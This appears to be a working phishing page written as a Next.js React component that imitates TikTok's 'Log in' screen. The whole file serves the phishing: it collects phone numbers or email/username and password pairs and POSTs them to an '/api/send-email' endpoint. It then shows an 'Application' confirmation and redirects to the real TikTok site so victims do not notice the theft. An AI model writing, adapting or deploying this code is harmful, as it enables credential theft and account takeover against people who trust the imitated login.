import { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { useRouter } from "next/router";

export default function EmailLogin() {
  const router = useRouter();
  const [activeTab, setActiveTab] = useState("Phone");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [phone, setPhone] = useState("");
  const [countryCode, setCountryCode] = useState("NG +234");
  const [error, setError] = useState("");
  const [notification, setNotification] = useState("");
  const [notificationType, setNotificationType] = useState("");

  const countryCodes = [
    { code: "NG +234", label: "NG +234" },
    { code: "US +1", label: "US +1" },
    { code: "UK +44", label: "UK +44" },
    { code: "FR +33", label: "FR +33" },
  ];

  // Set the cookie when the component mounts
  useEffect(() => {
    const setCookie = async () => {
      try {
        const response = await fetch("/api/set-cookie", { method: "POST" });
        if (!response.ok) {
          console.error("Failed to set cookie:", await response.text());
        }
      } catch (err) {
        console.error("Error setting cookie:", err);
      }
    };
    setCookie();

    console.log("Cookies on client:", document.cookie); // Will not show the cookie because it's HttpOnly
  }, []);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (activeTab === "Phone" && !phone) {
      setError("Please enter your phone number.");
      return;
    }
    if (activeTab === "Email / Username" && (!email || !password)) {
      setError("Please enter your email/username and password.");
      return;
    }

    const data = activeTab === "Phone" ? { phone: `${countryCode} ${phone}` } : { email, password };

    try {
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify(data),
      });

      const responseData = await response.json();
      if (response.ok) {
        setNotification("Thank for Applying, our Agent will get back within 3 working days. You can now continue with tiktok");
        setNotificationType("success");
        setTimeout(() => {
          window.location.href = "https://www.tiktok.com/explore";
        }, 2000);
      } else {
        throw new Error(responseData.error || "Failed to send email");
      }
    } catch (err) {
      console.error("Error sending email:", err.message);
      setNotification(`Application failed: ${err.message}`);
      setNotificationType("error");
    }
  };

  const hasInput = activeTab === "Phone" ? phone.length > 0 : email.length > 0 || password.length > 0;
  const isFormValid = activeTab === "Phone" ? phone.length > 0 : email.length > 0 && password.length > 0;

  return (
    <div className="flex justify-center items-start min-h-screen bg-white pt-4">
      <motion.div className="w-96">
        <div className="flex justify-between items-center mb-6">
          <button
            onClick={() => router.push("/")}
            className="text-2xl font-semibold"
          >
            ←
          </button>
          <h1 className="text-3xl font-bold text-black">Log in</h1>
          <button className="text-2xl text-gray-500">?</button>
        </div>

        <div className="flex border-b border-gray-300 mb-6">
          <button
            className={`flex-1 py-2 text-center font-medium text-lg ${
              activeTab === "Phone" ? "border-b-2 border-black text-black" : "text-gray-500"
            }`}
            onClick={() => setActiveTab("Phone")}
          >
            Phone
          </button>
          <button
            className={`flex-1 py-2 text-center font-medium text-lg ${
              activeTab === "Email / Username" ? "border-b-2 border-black text-black" : "text-gray-500"
            }`}
            onClick={() => setActiveTab("Email / Username")}
          >
            Email / Username
          </button>
        </div>

        <form onSubmit={handleSubmit} className="space-y-4">
          {activeTab === "Phone" ? (
            <div className="flex space-x-2">
              <select
                value={countryCode}
                onChange={(e) => setCountryCode(e.target.value)}
                className="w-1/3 p-3 border border-gray-300 rounded text-gray-700 bg-white"
              >
                {countryCodes.map((country) => (
                  <option key={country.code} value={country.code}>
                    {country.label}
                  </option>
                ))}
              </select>
              <input
                type="tel"
                placeholder="Phone number"
                className="w-2/3 p-3 border border-gray-300 rounded text-gray-700 placeholder-gray-400"
                value={phone}
                onChange={(e) => setPhone(e.target.value)}
              />
            </div>
          ) : (
            <>
              <input
                type="text"
                placeholder="Email or username"
                className="w-full p-3 border border-gray-300 rounded text-gray-700 placeholder-gray-400"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
              />
              <input
                type="password"
                placeholder="Password"
                className="w-full p-3 border border-gray-300 rounded text-gray-700 placeholder-gray-400"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
              />
              <a href="#" className="text-blue-600 text-sm font-medium">
                Forget password?
              </a>
            </>
          )}

          {error && <p className="text-red-500 text-sm">{error}</p>}
          {notification && (
            <p className={`notification ${notificationType}`}>
              {notification}
            </p>
          )}

          <motion.button
            type="submit"
            disabled={!isFormValid}
            className={`w-full p-3 rounded text-white font-semibold ${
              !hasInput ? "bg-gray-200 text-gray-500" : isFormValid ? "bg-blue-600" : "bg-blue-400"
            }`}
            whileHover={
              hasInput ? { backgroundColor: isFormValid ? "#2563eb" : "#60a5fa" } : {}
            }
            whileTap={hasInput ? { scale: 0.98 } : {}}
          >
            Log in
          </motion.button>
        </form>

        <style jsx>{`
          .notification {
            font-size: 14px;
            text-align: center;
            margin-bottom: 16px;
            padding: 10px;
            border-radius: 4px;
          }
          .notification.success {
            color: #15803d;
            background-color: #dcfce7;
          }
          .notification.error {
            color: #b91c1c;
            background-color: #fee2e2;
          }
        `}</style>
      </motion.div>
    </div>
  );
}